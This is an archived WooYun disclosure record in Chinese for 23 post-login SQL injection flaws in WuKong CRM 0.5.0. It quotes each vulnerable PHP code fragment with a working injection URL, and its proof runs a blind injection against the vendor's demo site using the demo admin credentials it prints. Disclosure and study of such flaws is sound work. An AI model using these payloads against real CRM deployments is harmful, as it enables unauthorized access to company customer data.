{"id": 16467, "wybug_id": "wooyun-2015-0105058", "wybug_title": "悟空CRM系统23处注入打包（需要登陆）", "wybug_corp": "5kcrm.com", "wybug_author": "Mr .LZH", "wybug_date": "2015-04-15 15:16", "wybug_open_date": "2015-07-17 10:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-17：\t细节向公众公开  简要描述： 23处sql注入，rank值最多20，平均一个注入不到1rank，在这个时代，漏洞好便宜。 详细说明：  开源程序：悟空CRM发布日期：2015/03/12 版本号：0.5.0 Beta其他版本未测。悟空CRM采用了thinkphp3.0框架，由于程序员没有遵循规范，造成sql注入。系统存在一些过滤，需要花些时间绕过。\nhttps://www.baidu.com/s?wd=%E6%82%9F%E7%A9%BACRM%20%C2%A9%20%E9%83%91%E5%B7%9E%E5%8D%A1%E5%8D%A1%E7%BD%97%E7%89%B9%E8%BD%AF%E4%BB%B6%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%202013&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_sug3=1\n文件路径都在App\\Lib\\Action下。注入1：\nKnowledgeAction 277行index.php?m=Knowledge&a=categoryEdit&id=1 and version()>5\tpublic function categoryEdit(){\t\tif($_GET['id']){\t\t\t$knowledge_category = M('knowledgeCategory');\t\t\t$category_list = $knowledge_category -> select();\t\t\t$this->assign('category_list', getSubCategory(0, $category_list, ''));\t\t\t$this->knowledge_category =$knowledge_category->where('category_id = ' . $_GET['id'])->find();\t\t\t$this->display();\t\t}elseif($_POST['submit']){\t\t\t$knowledge_category = M('knowledgeCategory');\t\t\t$knowledge_category -> create();\t\t\tif($knowledge_category -> save()){\t\t\t\talert('success',L('UPDATE_CATEGORY_INFO_SUCCESS'),U('knowledge/category'));\t\t\t}else{\t\t\t\talert('error',L('DATA_UNCHANGE_UPDATE_CATEGORY_INFO_FAILY'),$_SERVER['HTTP_REFERER']);\t\t\t}\t\t}else{\t\t\t$this->error(L('PARAMETER_ERROR'));\t\t}\t}\n$this->knowledge_category =$knowledge_category->where('category_id = ' . $_GET['id'])->find();存在注入。访问/index.php?m=Knowledge&a=categoryEdit&id=1 and version()>5\n\n\n\n注入2：\nUserAction 817行index.php?m=User&a=department_edit&id=1 and version()>5elseif($_GET['id']){\t\t\t$department = M('roleDepartment');\t\t\t$this->assign('vo',$department->where('department_id=' . $_GET['id'])->find());\t\t\t$department_list = $department->select();\t\t\t\t\t\t\tforeach($department_list as $key=>$value){\t\t\t\tif($value['department_id'] == $_GET['id']){\t\t\t\t\tunset($department_list[$key]);\t\t\t\t}\t\t\t\tif($value['parent_id'] == $_GET['id']){\t\t\t\t\tunset($department_list[$key]);\t\t\t\t}\t\t\t}\t\t\t$this->assign('departmentList', getSubDepartment(0,$department_list,''));\t\t\t$this->display();\t\t}else{\n$this->assign('vo',$department->where('department_id=' . $_GET['id'])->find());存在注入。\n\n注入3：\nSettingAction 545行index.php?m=Setting&a=statusflowEdit&id=1 and version()>5public function statusflowEdit(){\t\tif ($this->isGet()) {\t\t\t$flow = M('BusinessStatusFlow')->where(\"flow_id =\" . $_GET['id'])->find();\t\t\t$this->flow = $flow;\t\t\t$this->data = unserialize($flow['data']);\t\t\t$this->statusList = M('BusinessStatus')->select();\t\t\t$this->display(); \t\t} elseif($this->isPost()) {\n$flow = M('BusinessStatusFlow')->where(\"flow_id =\" . $_GET['id'])->find();存在注入。注入4：\nProductAction 14行public function validate() {\t\tif($this->isAjax()){            if(!$this->_request('clientid','trim') || !$this->_request($this->_request('clientid','trim'),'trim')) $this->ajaxReturn(\"\",\"\",3);            $field = M('Fields')->where('model = \"product\" and field = \"'.$this->_request('clientid','trim').'\"')->find();            $m_product = $field['is_main'] ? D('Product') : D('ProductData');            $where[$this->_request('clientid','trim')] = array('eq',$this->_request($this->_request('clientid','trim'),'trim'));            if($this->_request('id','intval',0)){                $where[$m_product->getpk()] = array('neq',$this->_request('id','intval',0));            }\n$field = M('Fields')->where('model = \"product\" and field = \"'.$this->_request('clientid','trim').'\"')->find();存在注入。这里需要满足2个条件：1.$this->isAjax() 这里只要在http头的X-Requested-With赋值XMLHttpRequest可通过。2.if(!$this->_request('clientid','trim') || !$this->_request($this->_request('clientid','trim'),'trim')) $this->ajaxReturn(\"\",\"\",3);相当于$clientid和$$clientid存在则通过。后面也存在类似案例，不再细致分析。注入5：\nProductAction 616行index.php?m=Product&a=listDialog&r=product&id=1&module=1 and sleep(5))%23aaaaa}elseif ($_GET['r'] && $_GET['module'] && $_GET['id']) {\t\t\t$id_array = M($_GET['r']) -> where($_GET['module'] . '_id = %d', $_GET['id']) -> getField('product_id', true);\t\t\t$id_array[] = 0;\t\t\t$this -> r = $_GET['r'];\t\t\t$this -> module = $_GET['module'];\t\t\t$this -> model_id = $_GET['id'];\t\t\t$d_product = D('ProductView');\t\t\t$a = $d_product->where('product_id not in (%s)', implode(',',$id_array))->select();\t\t\t$this->list = $a;\t\t\t$this->display();\t\t}else{\n$id_array = M($_GET['r']) -> where($_GET['module'] . '_id = %d', $_GET['id']) -> getField('product_id', true);存在注入。注入6：\nProductAction 645行index.php?m=Product&a=addDialog&r=product&id=1&module=1 and sleep(5))%23aaaaa\t\t}elseif ($_GET['r'] && $_GET['module'] && $_GET['id']) {\t\t\t$id_array = M($_GET['r']) -> where($_GET['module'] . '_id = %d', $_GET['id']) -> getField('product_id', true);\t\t\t$id_array[] = 0;\t\t\t$this -> r = $_GET['r'];\t\t\t$this -> module = $_GET['module'];\t\t\t$this -> model_id = $_GET['id'];\t\t\t$d_product = D('ProductView');\t\t\t$a = $d_product->where('product_id not in (%s)', implode(',',$id_array))->select();\t\t\t$this->list = $a;\t\t\t$this->display();\t\t}else{\n$id_array = M($_GET['r']) -> where($_GET['module'] . '_id = %d', $_GET['id']) -> getField('product_id', true);存在注入。注入7：\nProductAction 813行index.php?m=Product&a=category_edit&id=1 and version()>5\tpublic function category_edit(){\t\tif($_GET['id']){\t\t\t$product_category = M('product_category');\t\t\t\t\t\t$category_list = $product_category->select();\t\t\t\t$this->assign('category_list', getSubCategory(0, $category_list, ''));\t\t\t$product_category = M('product_category');\t\t\t$categoryList = $product_category->select();\t//读取分类列表 加载下拉框\t\t\tforeach($categoryList as $key=>$value){\t\t\t\tif($value['category_id'] == $_GET['id']){\t\t\t\t\tunset($categoryList[$key]);\t\t\t\t}\t\t\t}\t\t\t\t\t\t$this->category_list = $categoryList;\t\t\t$this->temp =$product_category->where('category_id = ' . $_GET['id'])->find();\t\t\t\t\t\t$this->display();\n$this->temp =$product_category->where('category_id = ' . $_GET['id'])->find();存在注入。注入8：\nPermission 55行\tpublic function module_delete(){\t\t$module = M('ControlModule');\t\tif($_POST['module_list']){\t\t\tif($module->where('module_id in (%s)', join($_POST['module_list'],','))->delete()){\t\t\t\talert('success', L('MODULE_WAS_REMOVED_SUCCESSFULLY'),$_SERVER['HTTP_REFERER']);\t\t\t}else{\t\t\t\talert('error', L('MODULE_WAS_REMOVED_FAILURE'),$_SERVER['HTTP_REFERER']);\t\t\t}\t\t}elseif($module->where('module_id =' . $_GET['id'])->delete()){\t\t\talert('success', L('MODULE_WAS_REMOVED_SUCCESSFULLY'),$_SERVER['HTTP_REFERER']);\t\t}else{\t\t\talert('error', L('MODULE_WAS_REMOVED_FAILURE_PLEASE_CONTACT_YOUR_ADMINISTRATOR'),$_SERVER['HTTP_REFERER']);\t\t}\t}\nif($module->where('module_id in (%s)', join($_POST['module_list'],','))->delete()){存在注入。注入9,10：\nPermission 65行Permission 72行public function module_edit(){\t\t$module = M('ControlModule');\t\tif($_GET['id']){\t\t\t$this->vo = $module->where('module_id =' . $_GET['id'])->find();\t\t\t$this->display();\t\t}elseif($_POST['name']){\t\t\t$module = D('ControlModule');\t\t\tif($module->create()){\t\t\t\t$data['name'] = $_POST['name'];\t\t\t\t$data['description'] = $_POST['description'];\t\t\t\tif($module->where('module_id =' . $_POST['module_id'])->save($data)){\t\t\t\t\talert('success', L('MODULE_MODIFICATION_OF_SUCCESS'),$_SERVER['HTTP_REFERER']);\t\t\t\t}else{\t\t\t\t\talert('error', L('COUNTLESS_ACCORDING_TO_THE_CHANGE_FAILED_TO_MODIFY_MODULE'),$_SERVER['HTTP_REFERER']);\t\t\t\t}\t\t\t} else {\t\t\t\talert('error', L('MODIFY_THE_ERROR_PLEASE_CONTACT_YOUR_ADMINISTRATOR'),$_SERVER['HTTP_REFERER']);\t\t\t}\t\t}\t}\n$this->vo = $module->where('module_id =' . $_GET['id'])->find();if($module->where('module_id =' . $_POST['module_id'])->save($data)){存在注入。注入11：\nPermission 151行}elseif($control->create()){\t\t\t\t$url =explode('/',$_POST['url']);\t\t\t\t$m = $url[0];\t\t\t\t$a = $url[1];\t\t\t\t$data['m'] = $m;\t\t\t\t$data['a'] = $a;\t\t\t\t$data['name'] = $_POST['name'];\t\t\t\t$data['description'] = $_POST['description'];\t\t\t\t$data['parameter'] = $_POST['parameter'];\t\t\t\t$data['module_id'] = $_POST['module_id'];\t\t\t\tif($control->where('control_id =' . $_POST['control_id'])->save($data)){\t\t\t\t\talert('success', L('OPERATION_IS_CHANGED'),$_SERVER['HTTP_REFERER']);\t\t\t\t}else{\nif($control->where('control_id =' . $_POST['control_id'])->save($data)){存在注入。注入12：\nPermission 162行$module = M('ControlModule');\t\t\t$this->moduleList = $module->select();\t\t\tif($_GET['id']){\t\t\t\t$this->vo = $control->where('control_id = ' . $_GET['id'])->find();\t\t\t\t$this->display();\t\t\t}else{\t\t\t\talert('error', L('MODIFIED_FAILURE_PARAMETER_ERROR'),$_SERVER['HTTP_REFERER']);\t\t\t}\n$this->vo = $control->where('control_id = ' . $_GET['id'])->find();存在注入。注入13：\nPermission 179行}elseif($_GET['id']){\t\t\tif($control->where('control_id =' . $_GET['id'])->delete()){\t\t\t\talert('success', L('DELETED SUCCESSFULLY'),$_SERVER['HTTP_REFERER']); \t\t\t} else {\t\t\t\talert('error', L('DELETE FAILED'),$_SERVER['HTTP_REFERER']);\t\t\t}\t\t}else{\nif($control->where('control_id =' . $_GET['id'])->delete()){存在注入。注入14：\nPermission 196行\tpublic function authorize(){\t\tif($_GET['by'] == 'permission'){\t\t\tif($_POST['control_id']){\t\t\t\t$roleList = $_POST['roleList'];\t\t\t\t$permission = M('UserPermission');\t\t\t\t$data['control_id'] = $_POST['control_id'];\t\t\t\t\t\t$temp = $permission->where('control_id =' . $_POST['control_id'])->select();\t\t\t\t$idList = array();\n$temp = $permission->where('control_id =' . $_POST['control_id'])->select();存在注入。注入15：\nPermission 230行if($_GET['control_id']){\t\t\t\t\t$where = isset($_GET['control_id'])?'control_id =' . $_GET['control_id']:'';\t\t\t\t\t$role = M('UserRole');\t\t\t\t\t$role_list = array();\t\t\t\t\t$permission = M('UserPermission');\t\t\t\t\t$department = M('UserDepartment');\t\t\t\t\t$permissionList = $permission->where($where)->select();\n$permissionList = $permission->where($where)->select();存在注入。注入16：\nPermission 257行if($_POST['role_id']){\t\t\t\t$controlList = $_POST['controlList'];\t\t\t\t$permission = M('UserPermission');\t\t\t\t$data['role_id'] = $_POST['role_id'];\t\t\t\t\t\t$temp = $permission->where('role_id =' . $_POST['role_id'])->select();\t\t\t\t$idList = array();\n$temp = $permission->where('role_id =' . $_POST['role_id'])->select();存在注入。注入17：\nPermission 291行if($_GET['role_id']){\t\t\t\t\t$where = isset($_GET['role_id'])?'role_id =' . $_GET['role_id']:'';\t\t\t\t\t$module = M('ControlModule');\t\t\t\t\t$permission = M('UserPermission');\t\t\t\t\t$control = M('Control');\t\t\t\t\t$controlList = $module->select();\t\t\t\t\t$existsList = $permission->where($where)->select();\t\t\t\t\tforeach($controlList as $key=>$value){\n$existsList = $permission->where($where)->select();存在注入。注入18：\nLeads 74行\tpublic function validate() {\t\tif($this->isAjax()){            if(!$this->_request('clientid','trim') || !$this->_request($this->_request('clientid','trim'),'trim')) $this->ajaxReturn(\"\",\"\",3);            $field = M('Fields')->where('model = \"leads\" and field = \"'.$this->_request('clientid','trim').'\"')->find();            $m_leads = $field['is_main'] ? D('Leads') : D('LeadsData');\n$field = M('Fields')->where('model = \"leads\" and field = \"'.$this->_request('clientid','trim').'\"')->find();存在注入。注入19：\nKnowledge 277行\tpublic function categoryEdit(){\t\tif($_GET['id']){\t\t\t$knowledge_category = M('knowledgeCategory');\t\t\t$category_list = $knowledge_category -> select();\t\t\t$this->assign('category_list', getSubCategory(0, $category_list, ''));\t\t\t$this->knowledge_category =$knowledge_category->where('category_id = ' . $_GET['id'])->find();\t\t\t$this->display();\n$this->knowledge_category =$knowledge_category->where('category_id = ' . $_GET['id'])->find();存在注入。注入20：\nCustomer 64行\tpublic function validate() {\t\tif($this->isAjax()){            if(!$this->_request('clientid','trim') || !$this->_request($this->_request('clientid','trim'),'trim')) $this->ajaxReturn(\"\",\"\",3);            $field = M('Fields')->where('model = \"customer\" and field = \"'.$this->_request('clientid','trim').'\"')->find();            $m_customer = $field['is_main'] ? D('Customer') : D('CustomerData');\n$field = M('Fields')->where('model = \"customer\" and field = \"'.$this->_request('clientid','trim').'\"')->find();存在注入。注入21：\nCustomer 756行\tif($m_customer->create()){\t\t\t\tif($m_customer_data->create()!==false){\t\t\t\t\t$m_customer->update_time = time();\t\t\t\t\t$a = $m_customer->where('customer_id=' . $customer['customer_id'])->save();\t\t\t\t\t$b = $m_customer_data->where('customer_id=' . $customer['customer_id'])->save();\t\t\t\t\tif($a !== false && $b !== false){\t\t\t\t\t\tif($_POST['contacts_id'] && ($_POST['contacts_id']!= $customer['contacts_id'])){\t\t\t\t\t\t\t$rcc['contacts_id'] = intval($_POST['contacts_id']);\t\t\t\t\t\t\t$rcc['customer_id'] = $customer['customer_id'];\t\t\t\t\t\t\tM('RContactsCustomer')->add($rcc);\t\t\t\t\t\t}\t\t\t\t\t\tactionLog($customer['customer_id']);\t\t\t\t\t\talert('success', L('EDIT_CLIENTS_SUCCESS'), U('customer/index'));\t\t\t\t\t\t\t\t\t\t\t}else{\n$a = $m_customer->where('customer_id=' . $customer['customer_id'])->save();$b = $m_customer_data->where('customer_id=' . $customer['customer_id'])->save();存在注入。注入22：\nContacts 68行if($_GET['redirect']){\t\t\t\t$this->redirect_id = $_GET['redirect_id'];\t\t\t\t$this->redirect = $_GET['redirect'];\t\t\t}\t\t\t$customer = M('customer');\t\t\t$this->customer_id =$customer_id = $_GET['customer_id'];\t\t\t$this->customer_name =$customer->where('customer_id =%s',$customer_id)->getField('name');\t\t\t$this->refer_url=$_SERVER['HTTP_REFERER'];\t\t\t$this->customer = $customer->where('customer_id =' . $_GET['redirect_id'])->find();\t\t\t$this->alert = parseAlert();\t\t\t$this->display();\n$this->customer = $customer->where('customer_id =' . $_GET['redirect_id'])->find();存在注入。注入23：\nBusiness 71行\tpublic function validate() {\t\tif($this->isAjax()){            if(!$this->_request('clientid','trim') || !$this->_request($this->_request('clientid','trim'),'trim')){\t\t\t\t$this->ajaxReturn(\"\",\"\",3);\t\t\t}            $field = M('Fields')->where('model = \"Business\" and field = \"'.$this->_request('clientid','trim').'\"')->find();            $m_business = $field['is_main'] ? D('Business') : D('BusinessData');\n$field = M('Fields')->where('model = \"Business\" and field = \"'.$this->_request('clientid','trim').'\"')->find();存在注入。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n补充：CRM系统一般部署在内网，而且需要员工账号登陆，比较难在互联网上复现。公布在互联网上，且被搜索引擎收录的有385条，按照各大源码下载站，最新版本从2015/03/12到2015/4/1单站下载量就达到上万，用户量还算不少。\n\n\n\n由于找不到互联网上的案例，就直接拿官网提供的试用网站证明。地址：http://crm.demo.5kcrm.com账号：admin 密码:123456a使用注入点1证明。登陆后访问：http://crm.demo.5kcrm.com/index.php?m=Knowledge&a=categoryEdit&id=1 and 1=if(CAST(DATABASE() AS CHAR) like 'crm_pre',1,2) （官网存在waf，手工注入后确认数据库名为：crm_pre）\n\n访问：http://crm.demo.5kcrm.com/index.php?m=Knowledge&a=categoryEdit&id=1 and 1=if(CAST(DATABASE() AS CHAR) like 'wooyun',1,2)  没有结果。\n\n   修复方案：  使用框架规范编写。   版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-18 10:38 厂商回复： 谢谢反馈   修复中 近些天会发布修复补丁包 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-02 14:54 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  需要登录的话一般没啥用吧    \n     2015-04-02 15:09 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @zcy 需要员工账号，可爆破得到，爆破员工账号还是挺容易的吧。而且CRM系统属于企业最重要的系统之一，危害程度可不小。    \n     2015-04-15 15:21 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  23处、、    \n     2015-04-15 15:28 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @px1624 还是用thinkphp框架的。    \n     2015-04-18 11:19 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @finger @疯狗 @xsser 0day大甩卖，一枚0.5rank    \n     2015-07-17 12:31 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  @Mr .LZH 这是多少钱    \n     2015-08-19 01:12 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  23处才500吗？    \n     2015-08-19 01:13 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  @牛肉包子 一个钱的符号不是100~200？    \n     2015-08-19 15:35 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  @牛肉包子 500    \n     2015-08-19 15:42 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  @Mr .LZH 我以为一个钱的符号最多才200    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}